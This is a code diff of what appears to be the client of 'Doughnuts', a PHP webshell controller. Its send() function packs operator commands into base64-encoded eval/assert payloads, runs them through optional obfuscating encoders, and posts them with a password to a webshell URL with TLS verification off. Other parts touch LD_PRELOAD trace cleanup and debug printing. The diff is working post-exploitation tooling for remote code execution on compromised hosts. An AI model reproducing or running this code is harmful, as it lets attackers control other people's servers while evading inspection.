@@ -1,19 +1,27 @@
-import json
-import subprocess
+from subprocess import check_output, Popen
 from base64 import b64decode, b64encode
 from platform import system
+from pprint import pprint
 from random import randint, sample
+from types import MethodType
+from urllib.parse import quote
 from uuid import uuid4
+from locale import getpreferredencoding
 
 import requests
+from requests.models import complexjson
+from requests.utils import guess_json_utf
 from urllib3 import disable_warnings
 
-from libs.debug import DEBUG_SEND
-from libs.config import color, gset, gget
+from libs.config import color, gget, gset
+from libs.debug import DEBUG
 
 level = []
 connect_pipe_map = {True: "│  ", False: "   "}
 SYSTEM_TEMPLATE = None
+Session = requests.Session()
+local_encoding = getpreferredencoding()
+
 
 disable_warnings()
 
@@ -50,17 +58,17 @@ def banner():
         print(
             r"""
 '########:::'#######::'##::::'##::'######:::'##::::'##:'##::: ##:'##::::'##:'########::'######::
- ##.... ##:'##.... ##: ##:::: ##:'##... ##:: ##:::: ##: ###:: ##: ##:::: ##:... ##..::'##... ##:
- ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::: ##:::: ##: ####: ##: ##:::: ##:::: ##:::: ##:::..::
- ##:::: ##: ##:::: ##: ##:::: ##: ##::'####: #########: ## ## ##: ##:::: ##:::: ##::::. ######::
- ##:::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##.... ##: ##. ####: ##:::: ##:::: ##:::::..... ##:
- ##:::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##:::: ##: ##:. ###: ##:::: ##:::: ##::::'##::: ##:
- ########::. #######::. #######::. ######::: ##:::: ##: ##::. ##:. #######::::: ##::::. ######::
+ # .... ##:'##.... ##: ##:::: ##:'##... ##:: ##:::: ##: ###:: ##: ##:::: ##:... ##..::'##... ##:
+ # :::: ##: ##:::: ##: ##:::: ##: ##:::..::: ##:::: ##: ####: ##: ##:::: ##:::: ##:::: ##:::..::
+ # :::: ##: ##:::: ##: ##:::: ##: ##::'####: #########: ## ## ##: ##:::: ##:::: ##::::. ######::
+ # :::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##.... ##: ##. ####: ##:::: ##:::: ##:::::..... ##:
+ # :::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##:::: ##: ##:. ###: ##:::: ##:::: ##::::'##::: ##:
+ # ::. #######::. #######::. ######::: ##:::: ##: ##::. ##:. #######::::: ##::::. ######::
 ........::::.......::::.......::::......::::..:::::..::..::::..:::.......::::::..::::::......:::
 
 """
         )
-    print(color.green("Doughnut Version: 3.1\n"))
+    print(color.green("Doughnut Version: 3.2\n"))
 
 
 def base64_encode(data: str):
@@ -93,12 +101,25 @@ def clean_trace():
     gset("webshell.ld_preload_func", None, True, "webshell")
 
 
+def r_json(self, **kwargs):
+    if not self.encoding and self.r_content and len(self.r_content) > 3:
+        encoding = guess_json_utf(self.r_content)
+        if encoding is not None:
+            try:
+                return complexjson.loads(
+                    self.r_content.decode(encoding), **kwargs
+                )
+            except UnicodeDecodeError:
+                pass
+    return complexjson.loads(self.r_text, **kwargs)
+
+
 def send(data: str, raw: bool = False, **extra_params):
     offset = 8
 
     def randstr(offset):
         return ''.join(sample("!@#$%^&*()[];,.?", offset))
-    url = gget("url", "webshell")
+    url = gget("webshell.url", "webshell")
     params_dict = gget("webshell.params_dict", "webshell").copy()
     php_v7 = gget("webshell.v7", "webshell")
     password = gget("webshell.password", "webshell")
@@ -130,13 +151,18 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
         data += f"""print("{tail}");"""
         data = f"""eval(base64_decode("{base64_encode(data)}"));"""
         if (not php_v7):
-            data = f"""assert(base64_decode("{base64_encode(data)}"));"""
+            data = f"""assert(eval(base64_decode("{base64_encode(data)}")));"""
     for func in encode_functions:
         if func in encode_pf:
             data = encode_pf[func].run(data)
+        elif ("doughnuts" in str(func)):
+            _, salt = func.split("-")
+            data = encode_pf["doughnuts"].run(data, salt)
+    if (raw_key == "cookies"):
+        data = quote(data)
     params_dict[raw_key][password] = data
     try:
-        req = requests.post(url, verify=False, **params_dict)
+        req = Session.post(url, verify=False, **params_dict)
     except requests.RequestException:
         print(color.red("\nRequest Error\n"))
         return
@@ -160,15 +186,20 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
         con_tail_offset != -1) else len(content)
     req.r_text = text[text_head_offset: text_tail_offset]
     req.r_content = content[con_head_offset: con_tail_offset]
-    try:
-        req.r_json = json.loads(req.r_text)
-    except json.JSONDecodeError:
-        req.r_json = ''
-    if DEBUG_SEND:  # DEBUG
-        print(f"[debug_dict] {params_dict}")
-        print(f"[debug-extra_parms] {extra_params}")
-        print(f"[debug_url] {url}")
-        print(f"[debug_res] [{req}] [len:{len(content)}] {text}")
+    req.r_json = MethodType(r_json, req)
+    if DEBUG["SEND"]:  # DEBUG
+        print(color.yellow(f"-----DEBUG START------"))
+        print(f"[{req.status_code}] {url} length: {len(req.r_text)} ", end="")
+        print(f"raw: {color.green('True')}" if raw else '')
+        for k, v in params_dict.items():
+            print(f"{k}: ", end="")
+            pprint(v)
+        print(color.green(f"----DEBUG RESPONSE----"))
+        print(req.r_text)
+        if (not req.r_text):
+            print(color.green(f"----DEBUG RAW RESPONSE----"))
+            print(req.text)
+        print(color.yellow(f"------DEBUG END-------\n"))
     return req
 
 
@@ -959,20 +990,23 @@ def has_env(env: str, remote: bool = True):
         else:
             flag = gget("webshell.has_%s" % env, "webshell")
     else:
-        if (not gget("has_%s")):
-            p = subprocess.Popen(
-                [command, env], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            flag = p.stdout.read()
+        if (not gget("has_%s" % env)):
+            flag = check_output([command, env]).strip().decode(local_encoding)
             gset("has_%s" % env, flag)
         else:
-            flag = gget("has_%s")
+            flag = gget("has_%s" % env)
     return len(flag)
 
 
-def open_editor(file_path: str):
-    editor = "notepad.exe" if has_env("notepad.exe", False) else "vi"
+def open_editor(file_path: str, editor: str = ""):
+    editor = editor if editor else ("notepad.exe" if has_env("notepad.exe") else "vi")
+    if (has_env(editor, False)):
+        path = gget(f"has_{editor}")
+    else:
+        print(color.red(f"{editor} not found in local environment"))
+        return False
     try:
-        p = subprocess.Popen([editor, file_path], shell=False)
+        p = Popen([path, file_path], shell=False)
         p.wait()
         return True
     except FileNotFoundError:
